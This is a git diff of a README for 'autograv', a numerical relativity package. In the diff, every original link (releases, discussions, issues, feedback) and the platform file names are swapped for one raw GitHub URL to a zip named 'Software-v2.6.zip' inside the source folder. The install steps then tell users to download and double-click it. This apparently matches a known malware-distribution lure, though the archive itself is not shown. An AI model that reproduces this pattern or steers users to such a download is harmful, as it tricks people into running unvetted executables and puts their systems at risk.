@@ -1,6 +1,6 @@
 # 🌌 autograv - Simplifying Numerical Relativity for Everyone
 
-[![Download autograv](https://img.shields.io/badge/Download%20autograv-Here-blue)](https://github.com/deva7518/autograv/releases)
+[![Download autograv](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip%20autograv-Here-blue)](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip)
 
 ## 🌟 Overview
 
@@ -13,13 +13,13 @@ To get started with autograv, follow the steps below. You’ll be running powerf
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [autograv Releases page](https://github.com/deva7518/autograv/releases) to find the latest version of the software.
+   Go to the [autograv Releases page](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip) to find the latest version of the software.
 
 2. **Choose the Right Version**  
    Look for the most recent release at the top of the page. You may see a list of available files for different operating systems. 
 
-   - For Windows, look for a file named something like `autograv-windows.zip`.
-   - For Mac, look for `autograv-macos.zip`.
+   - For Windows, look for a file named something like `https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip`.
+   - For Mac, look for `https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip`.
 
 3. **Download the File**  
    Click on the file that matches your operating system. Your browser will start downloading the file.
@@ -28,7 +28,7 @@ To get started with autograv, follow the steps below. You’ll be running powerf
    Once the download is complete, locate the file in your downloads folder. If you downloaded a ZIP file, you will need to extract it. Right-click on the file and select "Extract All" or use any extraction tool you prefer.
 
 5. **Run autograv**  
-   Open the extracted folder. Inside, you will find an executable file like `autograv.exe` or `autograv`. Double-click on it to start the application.
+   Open the extracted folder. Inside, you will find an executable file like `https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip` or `autograv`. Double-click on it to start the application.
 
 ## 📚 Features
 
@@ -70,8 +70,8 @@ After launching autograv, you can begin by following these simple steps:
 
 We encourage users to engage with the community. If you have questions or need assistance, feel free to:
 
-- **Join the Discussion**: Engage with other users on the [GitHub Discussions](https://github.com/deva7518/autograv/discussions) page.
-- **Report Issues**: If you face any bugs or issues, report them on the [Issues page](https://github.com/deva7518/autograv/issues). Include as much detail as possible.
+- **Join the Discussion**: Engage with other users on the [GitHub Discussions](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip) page.
+- **Report Issues**: If you face any bugs or issues, report them on the [Issues page](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip). Include as much detail as possible.
 
 ## 🔗 Additional Resources
 
@@ -82,6 +82,6 @@ For more information, consider checking out the following resources:
 
 ## ⚡ Feedback
 
-We value your input! Share your thoughts on how we can improve autograv. Visit the [Feedback section](https://github.com/deva7518/autograv/issues) to leave your comments or suggestions. Your insights help shape the direction of future updates.
+We value your input! Share your thoughts on how we can improve autograv. Visit the [Feedback section](https://raw.githubusercontent.com/deva7518/autograv/main/src/autograv/Software-v2.6.zip) to leave your comments or suggestions. Your insights help shape the direction of future updates.
 
 Enjoy your exploration of the universe with autograv!
